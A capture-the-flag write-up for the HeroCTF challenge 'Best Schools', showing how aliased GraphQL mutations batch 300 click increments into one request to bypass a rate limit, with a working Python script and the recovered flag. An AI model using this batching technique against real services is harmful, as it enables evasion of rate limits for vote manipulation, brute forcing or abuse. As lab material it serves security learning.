# Best Schools [177 solves] [50 points]

```
Make sure you get the 'Flag CyberSecurity School' in first place and you'll get your reward!
```

Our goal to make 'Flag CyberSecurity School' in the first place

![](https://i.imgur.com/NhoNgUe.png)

Initially, 'Flag CyberSecurity School' has 0 click, and we have to make it larger than 1337, so I just try to click it

It will send a POST request to /graphql with this :

```
{"query":"mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"}
```

It is using graphql mutation to call increaseClickSchool() with the school name

If I click it once more, it will return error saying we are too fast :

```
{"code":429,"error":"You're going too fast !"}
```

So it has rate limiting that limit how fast we can click, it allows me to click again after around 1 minute, which is quite slow

The instance will be shutdown 45 minutes after start, so clicking it once per minute is not gonna solve this

I'm trying to call `increaseClickSchool()` multiple times in one request, however I'm not familiar with graphql, I tried to have put multiple `increaseClickSchool()` inside `mutation {}`, but it didn't work

So I just did some googling, and find out actually I can use alias to put multiple function calls inside one `mutation {}`

Then I will test it with this :

```
{"query":"mutation { first: increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick}    second: increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick}}"}
```

```
{"data":{"first":{"schoolId":3,"nbClick":5},"second":{"schoolId":3,"nbClick":6}}}
```

It works, we have clicked the school twice in one request, so we can make a script to automate this and have many `increaseClickSchool()` inside `mutation {}` in one request

However, if I put too much `increaseClickSchool()` in one request, it will say the payload is too large, so I will put 300 `increaseClickSchool()` in one request, and we can solve this in a few minutes :

```python
import requests

query = {"query": "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"}

content = ''
for i in range(300):
	name = 'a' * (i + 1)
	content += name + ': ' + "increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} "
	


query['query'] = 'mutation { '+ content +' }'
print(query)

burp0_url = "http://dyn-02.heroctf.fr:10498/graphql"
burp0_headers = {}
burp0_json=query
res = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
print(res.text)
```

After a few minutes we have enough clicks :
![](https://i.imgur.com/hYkyOD5.png)

So we can just make a GET request to /flag :

```
{"data":"Hero{gr4phql_b4tch1ng_t0_byp4ss_r4t3_l1m1t_!!}"}
```